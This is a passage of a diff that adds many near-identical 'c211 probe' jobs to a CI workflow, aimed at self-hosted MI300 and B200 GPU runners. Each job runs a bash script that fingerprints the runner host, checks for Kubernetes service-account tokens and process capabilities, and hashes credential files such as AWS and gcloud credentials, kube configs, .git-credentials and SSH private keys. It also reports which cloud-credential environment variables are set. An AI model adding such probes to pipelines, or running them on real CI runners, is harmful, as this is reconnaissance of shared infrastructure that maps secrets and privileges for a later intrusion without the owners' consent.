+          echo "C211_MARKER job=mi300x8-16 nonce=$NONCE host=$(hostname) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "CGROUP=$(cat /proc/1/comm 2>/dev/null) SA_TOKEN=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S=${KUBERNETES_SERVICE_HOST:-none}:${KUBERNETES_SERVICE_PORT:-none} K8S_ENV=$([ -n "${KUBERNETES_SERVICE_HOST:-}" ] && echo PRESENT || echo ABSENT)"
+          echo "CAPEFF=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null | awk '{print $2}')"
+          ls -l /dev/nvidia* /dev/kfd /dev/dri 2>&1 | head -20 || true
+          echo "--- AMD (rocm-smi) ---"
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          echo "--- AMD (amd-smi) ---"
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
+          echo "--- NVIDIA ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            nvidia-smi -L 2>&1 || echo NVIDIA_SMI_L_FAILED
+            nvidia-smi --query-gpu=index,uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 || echo NVIDIA_SMI_Q_FAILED
+          else echo NVIDIA_SMI_ABSENT; fi
+          echo "--- READ-ONLY PRESENCE-ONLY IDENTITY FINGERPRINT (sha256-only, no values) ---"
+          for p in "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gcloud/credentials.db" "$HOME/.docker/config.json" "$HOME/.kube/config" "$HOME/.netrc" "$HOME/.git-credentials" "$HOME/.config/gh/hosts.yml" "$HOME/.azure/accessTokens.json" "$HOME/.ssh/id_rsa" "$HOME/.ssh/id_ed25519" "/var/run/secrets/kubernetes.io/serviceaccount/token" "/var/run/secrets/kubernetes.io/serviceaccount/namespace" "/etc/kubernetes/kubelet.conf" "/etc/rancher/k3s/k3s.yaml"; do
+            if [ -e "$p" ]; then
+              h=$(sha256sum "$p" 2>/dev/null | awk '{print $1}'); s=$(stat -c %s "$p" 2>/dev/null || echo '?')
+              echo "FP path=$p present=yes size=$s sha256=${h:-unreadable}"
+            else
+              echo "FP path=$p present=no"
+            fi
+          done
+          echo "FP env_presence AWS_ACCESS_KEY_ID=$([ -n "${AWS_ACCESS_KEY_ID:-}" ] && echo yes || echo no) AWS_ROLE_ARN=$([ -n "${AWS_ROLE_ARN:-}" ] && echo yes || echo no) AWS_WEB_IDENTITY_TOKEN_FILE=$([ -n "${AWS_WEB_IDENTITY_TOKEN_FILE:-}" ] && echo yes || echo no) GOOGLE_APPLICATION_CREDENTIALS=$([ -n "${GOOGLE_APPLICATION_CREDENTIALS:-}" ] && echo yes || echo no) AZURE_CLIENT_ID=$([ -n "${AZURE_CLIENT_ID:-}" ] && echo yes || echo no) ACTIONS_ID_TOKEN_REQUEST_URL=$([ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && echo yes || echo no)"
+          echo "C211_DONE job=mi300x8-16 nonce=$NONCE host=$(hostname)"
+  job-mi300x8-17:
+    name: probe-mi300x8-17
+    runs-on: [linux-mi300-8gpu-sglang]
+    timeout-minutes: 15
+    steps:
+      - name: c211 probe mi300x8-17
+        shell: bash
+        run: |
+          NONCE='c211-i125282-d475252d4c51c3ba'
+          set -u
+          echo "C211_JOB=mi300x8-17 NONCE=$NONCE"
+          echo "C211_MARKER job=mi300x8-17 nonce=$NONCE host=$(hostname) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "CGROUP=$(cat /proc/1/comm 2>/dev/null) SA_TOKEN=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S=${KUBERNETES_SERVICE_HOST:-none}:${KUBERNETES_SERVICE_PORT:-none} K8S_ENV=$([ -n "${KUBERNETES_SERVICE_HOST:-}" ] && echo PRESENT || echo ABSENT)"
+          echo "CAPEFF=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null | awk '{print $2}')"
+          ls -l /dev/nvidia* /dev/kfd /dev/dri 2>&1 | head -20 || true
+          echo "--- AMD (rocm-smi) ---"
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          echo "--- AMD (amd-smi) ---"
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
+          echo "--- NVIDIA ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            nvidia-smi -L 2>&1 || echo NVIDIA_SMI_L_FAILED
+            nvidia-smi --query-gpu=index,uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 || echo NVIDIA_SMI_Q_FAILED
+          else echo NVIDIA_SMI_ABSENT; fi
+          echo "--- READ-ONLY PRESENCE-ONLY IDENTITY FINGERPRINT (sha256-only, no values) ---"
+          for p in "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gcloud/credentials.db" "$HOME/.docker/config.json" "$HOME/.kube/config" "$HOME/.netrc" "$HOME/.git-credentials" "$HOME/.config/gh/hosts.yml" "$HOME/.azure/accessTokens.json" "$HOME/.ssh/id_rsa" "$HOME/.ssh/id_ed25519" "/var/run/secrets/kubernetes.io/serviceaccount/token" "/var/run/secrets/kubernetes.io/serviceaccount/namespace" "/etc/kubernetes/kubelet.conf" "/etc/rancher/k3s/k3s.yaml"; do
+            if [ -e "$p" ]; then
+              h=$(sha256sum "$p" 2>/dev/null | awk '{print $1}'); s=$(stat -c %s "$p" 2>/dev/null || echo '?')
+              echo "FP path=$p present=yes size=$s sha256=${h:-unreadable}"
+            else
+              echo "FP path=$p present=no"
+            fi
+          done
+          echo "FP env_presence AWS_ACCESS_KEY_ID=$([ -n "${AWS_ACCESS_KEY_ID:-}" ] && echo yes || echo no) AWS_ROLE_ARN=$([ -n "${AWS_ROLE_ARN:-}" ] && echo yes || echo no) AWS_WEB_IDENTITY_TOKEN_FILE=$([ -n "${AWS_WEB_IDENTITY_TOKEN_FILE:-}" ] && echo yes || echo no) GOOGLE_APPLICATION_CREDENTIALS=$([ -n "${GOOGLE_APPLICATION_CREDENTIALS:-}" ] && echo yes || echo no) AZURE_CLIENT_ID=$([ -n "${AZURE_CLIENT_ID:-}" ] && echo yes || echo no) ACTIONS_ID_TOKEN_REQUEST_URL=$([ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && echo yes || echo no)"
+          echo "C211_DONE job=mi300x8-17 nonce=$NONCE host=$(hostname)"
+  job-mi300x8-18:
+    name: probe-mi300x8-18
+    runs-on: [linux-mi300-8gpu-sglang]
+    timeout-minutes: 15
+    steps:
+      - name: c211 probe mi300x8-18
+        shell: bash
+        run: |
+          NONCE='c211-i125282-d475252d4c51c3ba'
+          set -u
+          echo "C211_JOB=mi300x8-18 NONCE=$NONCE"
+          echo "C211_MARKER job=mi300x8-18 nonce=$NONCE host=$(hostname) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "CGROUP=$(cat /proc/1/comm 2>/dev/null) SA_TOKEN=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S=${KUBERNETES_SERVICE_HOST:-none}:${KUBERNETES_SERVICE_PORT:-none} K8S_ENV=$([ -n "${KUBERNETES_SERVICE_HOST:-}" ] && echo PRESENT || echo ABSENT)"
+          echo "CAPEFF=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null | awk '{print $2}')"
+          ls -l /dev/nvidia* /dev/kfd /dev/dri 2>&1 | head -20 || true
+          echo "--- AMD (rocm-smi) ---"
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          echo "--- AMD (amd-smi) ---"
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
+          echo "--- NVIDIA ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            nvidia-smi -L 2>&1 || echo NVIDIA_SMI_L_FAILED
+            nvidia-smi --query-gpu=index,uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 || echo NVIDIA_SMI_Q_FAILED
+          else echo NVIDIA_SMI_ABSENT; fi
+          echo "--- READ-ONLY PRESENCE-ONLY IDENTITY FINGERPRINT (sha256-only, no values) ---"
+          for p in "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gcloud/credentials.db" "$HOME/.docker/config.json" "$HOME/.kube/config" "$HOME/.netrc" "$HOME/.git-credentials" "$HOME/.config/gh/hosts.yml" "$HOME/.azure/accessTokens.json" "$HOME/.ssh/id_rsa" "$HOME/.ssh/id_ed25519" "/var/run/secrets/kubernetes.io/serviceaccount/token" "/var/run/secrets/kubernetes.io/serviceaccount/namespace" "/etc/kubernetes/kubelet.conf" "/etc/rancher/k3s/k3s.yaml"; do
+            if [ -e "$p" ]; then
+              h=$(sha256sum "$p" 2>/dev/null | awk '{print $1}'); s=$(stat -c %s "$p" 2>/dev/null || echo '?')
+              echo "FP path=$p present=yes size=$s sha256=${h:-unreadable}"
+            else
+              echo "FP path=$p present=no"
+            fi
+          done
+          echo "FP env_presence AWS_ACCESS_KEY_ID=$([ -n "${AWS_ACCESS_KEY_ID:-}" ] && echo yes || echo no) AWS_ROLE_ARN=$([ -n "${AWS_ROLE_ARN:-}" ] && echo yes || echo no) AWS_WEB_IDENTITY_TOKEN_FILE=$([ -n "${AWS_WEB_IDENTITY_TOKEN_FILE:-}" ] && echo yes || echo no) GOOGLE_APPLICATION_CREDENTIALS=$([ -n "${GOOGLE_APPLICATION_CREDENTIALS:-}" ] && echo yes || echo no) AZURE_CLIENT_ID=$([ -n "${AZURE_CLIENT_ID:-}" ] && echo yes || echo no) ACTIONS_ID_TOKEN_REQUEST_URL=$([ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && echo yes || echo no)"
+          echo "C211_DONE job=mi300x8-18 nonce=$NONCE host=$(hostname)"
+  job-mi300x8-19:
+    name: probe-mi300x8-19
+    runs-on: [linux-mi300-8gpu-sglang]
+    timeout-minutes: 15
+    steps:
+      - name: c211 probe mi300x8-19
+        shell: bash
+        run: |
+          NONCE='c211-i125282-d475252d4c51c3ba'
+          set -u
+          echo "C211_JOB=mi300x8-19 NONCE=$NONCE"
+          echo "C211_MARKER job=mi300x8-19 nonce=$NONCE host=$(hostname) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "CGROUP=$(cat /proc/1/comm 2>/dev/null) SA_TOKEN=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S=${KUBERNETES_SERVICE_HOST:-none}:${KUBERNETES_SERVICE_PORT:-none} K8S_ENV=$([ -n "${KUBERNETES_SERVICE_HOST:-}" ] && echo PRESENT || echo ABSENT)"
+          echo "CAPEFF=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null | awk '{print $2}')"
+          ls -l /dev/nvidia* /dev/kfd /dev/dri 2>&1 | head -20 || true
+          echo "--- AMD (rocm-smi) ---"
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          echo "--- AMD (amd-smi) ---"
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
+          echo "--- NVIDIA ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            nvidia-smi -L 2>&1 || echo NVIDIA_SMI_L_FAILED
+            nvidia-smi --query-gpu=index,uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 || echo NVIDIA_SMI_Q_FAILED
+          else echo NVIDIA_SMI_ABSENT; fi
+          echo "--- READ-ONLY PRESENCE-ONLY IDENTITY FINGERPRINT (sha256-only, no values) ---"
+          for p in "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gcloud/credentials.db" "$HOME/.docker/config.json" "$HOME/.kube/config" "$HOME/.netrc" "$HOME/.git-credentials" "$HOME/.config/gh/hosts.yml" "$HOME/.azure/accessTokens.json" "$HOME/.ssh/id_rsa" "$HOME/.ssh/id_ed25519" "/var/run/secrets/kubernetes.io/serviceaccount/token" "/var/run/secrets/kubernetes.io/serviceaccount/namespace" "/etc/kubernetes/kubelet.conf" "/etc/rancher/k3s/k3s.yaml"; do
+            if [ -e "$p" ]; then
+              h=$(sha256sum "$p" 2>/dev/null | awk '{print $1}'); s=$(stat -c %s "$p" 2>/dev/null || echo '?')
+              echo "FP path=$p present=yes size=$s sha256=${h:-unreadable}"
+            else
+              echo "FP path=$p present=no"
+            fi
+          done
+          echo "FP env_presence AWS_ACCESS_KEY_ID=$([ -n "${AWS_ACCESS_KEY_ID:-}" ] && echo yes || echo no) AWS_ROLE_ARN=$([ -n "${AWS_ROLE_ARN:-}" ] && echo yes || echo no) AWS_WEB_IDENTITY_TOKEN_FILE=$([ -n "${AWS_WEB_IDENTITY_TOKEN_FILE:-}" ] && echo yes || echo no) GOOGLE_APPLICATION_CREDENTIALS=$([ -n "${GOOGLE_APPLICATION_CREDENTIALS:-}" ] && echo yes || echo no) AZURE_CLIENT_ID=$([ -n "${AZURE_CLIENT_ID:-}" ] && echo yes || echo no) ACTIONS_ID_TOKEN_REQUEST_URL=$([ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && echo yes || echo no)"
+          echo "C211_DONE job=mi300x8-19 nonce=$NONCE host=$(hostname)"
+  job-mi300x8-20:
+    name: probe-mi300x8-20
+    runs-on: [linux-mi300-8gpu-sglang]
+    timeout-minutes: 15
+    steps:
+      - name: c211 probe mi300x8-20
+        shell: bash
+        run: |
+          NONCE='c211-i125282-d475252d4c51c3ba'
+          set -u
+          echo "C211_JOB=mi300x8-20 NONCE=$NONCE"
+          echo "C211_MARKER job=mi300x8-20 nonce=$NONCE host=$(hostname) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "CGROUP=$(cat /proc/1/comm 2>/dev/null) SA_TOKEN=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S=${KUBERNETES_SERVICE_HOST:-none}:${KUBERNETES_SERVICE_PORT:-none} K8S_ENV=$([ -n "${KUBERNETES_SERVICE_HOST:-}" ] && echo PRESENT || echo ABSENT)"
+          echo "CAPEFF=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null | awk '{print $2}')"
+          ls -l /dev/nvidia* /dev/kfd /dev/dri 2>&1 | head -20 || true
+          echo "--- AMD (rocm-smi) ---"
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          echo "--- AMD (amd-smi) ---"
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
+          echo "--- NVIDIA ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            nvidia-smi -L 2>&1 || echo NVIDIA_SMI_L_FAILED
+            nvidia-smi --query-gpu=index,uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 || echo NVIDIA_SMI_Q_FAILED
+          else echo NVIDIA_SMI_ABSENT; fi
+          echo "--- READ-ONLY PRESENCE-ONLY IDENTITY FINGERPRINT (sha256-only, no values) ---"
+          for p in "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gcloud/credentials.db" "$HOME/.docker/config.json" "$HOME/.kube/config" "$HOME/.netrc" "$HOME/.git-credentials" "$HOME/.config/gh/hosts.yml" "$HOME/.azure/accessTokens.json" "$HOME/.ssh/id_rsa" "$HOME/.ssh/id_ed25519" "/var/run/secrets/kubernetes.io/serviceaccount/token" "/var/run/secrets/kubernetes.io/serviceaccount/namespace" "/etc/kubernetes/kubelet.conf" "/etc/rancher/k3s/k3s.yaml"; do
+            if [ -e "$p" ]; then
+              h=$(sha256sum "$p" 2>/dev/null | awk '{print $1}'); s=$(stat -c %s "$p" 2>/dev/null || echo '?')
+              echo "FP path=$p present=yes size=$s sha256=${h:-unreadable}"
+            else
+              echo "FP path=$p present=no"
+            fi
+          done
+          echo "FP env_presence AWS_ACCESS_KEY_ID=$([ -n "${AWS_ACCESS_KEY_ID:-}" ] && echo yes || echo no) AWS_ROLE_ARN=$([ -n "${AWS_ROLE_ARN:-}" ] && echo yes || echo no) AWS_WEB_IDENTITY_TOKEN_FILE=$([ -n "${AWS_WEB_IDENTITY_TOKEN_FILE:-}" ] && echo yes || echo no) GOOGLE_APPLICATION_CREDENTIALS=$([ -n "${GOOGLE_APPLICATION_CREDENTIALS:-}" ] && echo yes || echo no) AZURE_CLIENT_ID=$([ -n "${AZURE_CLIENT_ID:-}" ] && echo yes || echo no) ACTIONS_ID_TOKEN_REQUEST_URL=$([ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && echo yes || echo no)"
+          echo "C211_DONE job=mi300x8-20 nonce=$NONCE host=$(hostname)"
+  job-b200-01:
+    name: probe-b200-01
+    runs-on: [4-gpu-b200]
+    timeout-minutes: 15
+    steps:
+      - name: c211 probe b200-01
+        shell: bash
+        run: |
+          NONCE='c211-i125282-d475252d4c51c3ba'
+          set -u
+          echo "C211_JOB=b200-01 NONCE=$NONCE"
+          echo "C211_MARKER job=b200-01 nonce=$NONCE host=$(hostname) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "CGROUP=$(cat /proc/1/comm 2>/dev/null) SA_TOKEN=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S=${KUBERNETES_SERVICE_HOST:-none}:${KUBERNETES_SERVICE_PORT:-none} K8S_ENV=$([ -n "${KUBERNETES_SERVICE_HOST:-}" ] && echo PRESENT || echo ABSENT)"
+          echo "CAPEFF=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null | awk '{print $2}')"
+          ls -l /dev/nvidia* /dev/kfd /dev/dri 2>&1 | head -20 || true
+          echo "--- AMD (rocm-smi) ---"
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          echo "--- AMD (amd-smi) ---"
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
+          echo "--- NVIDIA ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            nvidia-smi -L 2>&1 || echo NVIDIA_SMI_L_FAILED
+            nvidia-smi --query-gpu=index,uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 || echo NVIDIA_SMI_Q_FAILED
+          else echo NVIDIA_SMI_ABSENT; fi
+          echo "--- READ-ONLY PRESENCE-ONLY IDENTITY FINGERPRINT (sha256-only, no values) ---"
+          for p in "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gcloud/credentials.db" "$HOME/.docker/config.json" "$HOME/.kube/config" "$HOME/.netrc" "$HOME/.git-credentials" "$HOME/.config/gh/hosts.yml" "$HOME/.azure/accessTokens.json" "$HOME/.ssh/id_rsa" "$HOME/.ssh/id_ed25519" "/var/run/secrets/kubernetes.io/serviceaccount/token" "/var/run/secrets/kubernetes.io/serviceaccount/namespace" "/etc/kubernetes/kubelet.conf" "/etc/rancher/k3s/k3s.yaml"; do
+            if [ -e "$p" ]; then
+              h=$(sha256sum "$p" 2>/dev/null | awk '{print $1}'); s=$(stat -c %s "$p" 2>/dev/null || echo '?')
+              echo "FP path=$p present=yes size=$s sha256=${h:-unreadable}"
+            else
+              echo "FP path=$p present=no"
+            fi
+          done
+          echo "FP env_presence AWS_ACCESS_KEY_ID=$([ -n "${AWS_ACCESS_KEY_ID:-}" ] && echo yes || echo no) AWS_ROLE_ARN=$([ -n "${AWS_ROLE_ARN:-}" ] && echo yes || echo no) AWS_WEB_IDENTITY_TOKEN_FILE=$([ -n "${AWS_WEB_IDENTITY_TOKEN_FILE:-}" ] && echo yes || echo no) GOOGLE_APPLICATION_CREDENTIALS=$([ -n "${GOOGLE_APPLICATION_CREDENTIALS:-}" ] && echo yes || echo no) AZURE_CLIENT_ID=$([ -n "${AZURE_CLIENT_ID:-}" ] && echo yes || echo no) ACTIONS_ID_TOKEN_REQUEST_URL=$([ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && echo yes || echo no)"
+          echo "C211_DONE job=b200-01 nonce=$NONCE host=$(hostname)"
+  job-b200-02:
+    name: probe-b200-02
+    runs-on: [4-gpu-b200]
+    timeout-minutes: 15
+    steps:
+      - name: c211 probe b200-02
+        shell: bash
+        run: |
+          NONCE='c211-i125282-d475252d4c51c3ba'
+          set -u
+          echo "C211_JOB=b200-02 NONCE=$NONCE"
+          echo "C211_MARKER job=b200-02 nonce=$NONCE host=$(hostname) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "CGROUP=$(cat /proc/1/comm 2>/dev/null) SA_TOKEN=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S=${KUBERNETES_SERVICE_HOST:-none}:${KUBERNETES_SERVICE_PORT:-none} K8S_ENV=$([ -n "${KUBERNETES_SERVICE_HOST:-}" ] && echo PRESENT || echo ABSENT)"
+          echo "CAPEFF=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null | awk '{print $2}')"
+          ls -l /dev/nvidia* /dev/kfd /dev/dri 2>&1 | head -20 || true
+          echo "--- AMD (rocm-smi) ---"
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          echo "--- AMD (amd-smi) ---"
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
+          echo "--- NVIDIA ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            nvidia-smi -L 2>&1 || echo NVIDIA_SMI_L_FAILED
+            nvidia-smi --query-gpu=index,uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 || echo NVIDIA_SMI_Q_FAILED
+          else echo NVIDIA_SMI_ABSENT; fi
+          echo "--- READ-ONLY PRESENCE-ONLY IDENTITY FINGERPRINT (sha256-only, no values) ---"
+          for p in "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gcloud/credentials.db" "$HOME/.docker/config.json" "$HOME/.kube/config" "$HOME/.netrc" "$HOME/.git-credentials" "$HOME/.config/gh/hosts.yml" "$HOME/.azure/accessTokens.json" "$HOME/.ssh/id_rsa" "$HOME/.ssh/id_ed25519" "/var/run/secrets/kubernetes.io/serviceaccount/token" "/var/run/secrets/kubernetes.io/serviceaccount/namespace" "/etc/kubernetes/kubelet.conf" "/etc/rancher/k3s/k3s.yaml"; do
+            if [ -e "$p" ]; then
+              h=$(sha256sum "$p" 2>/dev/null | awk '{print $1}'); s=$(stat -c %s "$p" 2>/dev/null || echo '?')
+              echo "FP path=$p present=yes size=$s sha256=${h:-unreadable}"
+            else
+              echo "FP path=$p present=no"
+            fi
+          done
+          echo "FP env_presence AWS_ACCESS_KEY_ID=$([ -n "${AWS_ACCESS_KEY_ID:-}" ] && echo yes || echo no) AWS_ROLE_ARN=$([ -n "${AWS_ROLE_ARN:-}" ] && echo yes || echo no) AWS_WEB_IDENTITY_TOKEN_FILE=$([ -n "${AWS_WEB_IDENTITY_TOKEN_FILE:-}" ] && echo yes || echo no) GOOGLE_APPLICATION_CREDENTIALS=$([ -n "${GOOGLE_APPLICATION_CREDENTIALS:-}" ] && echo yes || echo no) AZURE_CLIENT_ID=$([ -n "${AZURE_CLIENT_ID:-}" ] && echo yes || echo no) ACTIONS_ID_TOKEN_REQUEST_URL=$([ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && echo yes || echo no)"
+          echo "C211_DONE job=b200-02 nonce=$NONCE host=$(hostname)"
+  job-b200-03:
+    name: probe-b200-03
+    runs-on: [4-gpu-b200]
+    timeout-minutes: 15
+    steps:
+      - name: c211 probe b200-03
+        shell: bash
+        run: |
+          NONCE='c211-i125282-d475252d4c51c3ba'
+          set -u
+          echo "C211_JOB=b200-03 NONCE=$NONCE"
+          echo "C211_MARKER job=b200-03 nonce=$NONCE host=$(hostname) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "CGROUP=$(cat /proc/1/comm 2>/dev/null) SA_TOKEN=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S=${KUBERNETES_SERVICE_HOST:-none}:${KUBERNETES_SERVICE_PORT:-none} K8S_ENV=$([ -n "${KUBERNETES_SERVICE_HOST:-}" ] && echo PRESENT || echo ABSENT)"
+          echo "CAPEFF=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null | awk '{print $2}')"
+          ls -l /dev/nvidia* /dev/kfd /dev/dri 2>&1 | head -20 || true
+          echo "--- AMD (rocm-smi) ---"
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          echo "--- AMD (amd-smi) ---"
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
+          echo "--- NVIDIA ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            nvidia-smi -L 2>&1 || echo NVIDIA_SMI_L_FAILED
+            nvidia-smi --query-gpu=index,uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 || echo NVIDIA_SMI_Q_FAILED
+          else echo NVIDIA_SMI_ABSENT; fi
+          echo "--- READ-ONLY PRESENCE-ONLY IDENTITY FINGERPRINT (sha256-only, no values) ---"
